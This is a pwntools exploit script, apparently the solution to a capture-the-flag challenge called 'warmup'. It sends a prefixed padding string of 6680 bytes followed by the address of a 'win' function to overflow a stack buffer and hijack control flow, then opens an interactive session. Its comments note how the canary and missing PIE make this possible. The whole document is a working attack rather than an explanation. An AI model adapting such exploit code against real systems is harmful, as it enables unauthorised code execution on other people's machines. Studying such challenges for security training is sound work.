#!/usr/bin/python
from pwn import *

LOCAL = False

# Target is local or remote
if LOCAL:
    t = process('./warmup')
else:
    # Do not forget to set you ip/port
    t = remote("127.0.0.1", 55555)

# Find all remaining stuff with ghidra or similar
# ... that's a piece of cake
# Checksec sees a canary, which is true but only for buffers >= 8k
# Win function (no pie)
win = 0x40132a

# Offset for overflow
offset = 6680

# Prefix needed to be part of overflow
prefix = b'baLCcon 2k25'

# Set up payload
payload = b''
payload += prefix + b'A' * (offset - len(prefix))
payload += p64(win)

# Send
t.recvuntil(b'\x1b[1m<Gimme input>\x1b[0m ')
t.sendline(payload)

t.interactive()

